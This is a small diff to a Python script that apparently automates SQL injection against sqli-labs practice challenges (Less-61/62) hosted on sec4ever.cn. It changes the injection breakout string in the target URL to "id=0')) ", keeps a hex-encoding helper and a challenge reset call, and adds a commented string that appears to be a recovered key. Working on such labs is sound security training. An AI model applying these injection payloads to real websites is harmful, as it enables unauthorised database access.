@@ -1,4 +1,3 @@
-# coding=utf-8
 # author:unc1e
 import requests
 import string
@@ -18,7 +17,7 @@ def str_to_hex(s):
     return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])
 
 # initialize param
-url = "https://sec4ever.cn/Less-62/index.php?id=0') "
+url = "https://sec4ever.cn/Less-61/index.php?id=0')) "
 reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id={}".format(url.split("sec4ever.cn")[1])   # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php
 
 
@@ -108,7 +107,9 @@ def getColumn():
 
 
 
-
+'''
+uwpeCvsrLcadsa8P7wSn9Ix4
+'''
 # 清空次数
 sess.get(url=reset_url, verify=VERIFY)
 
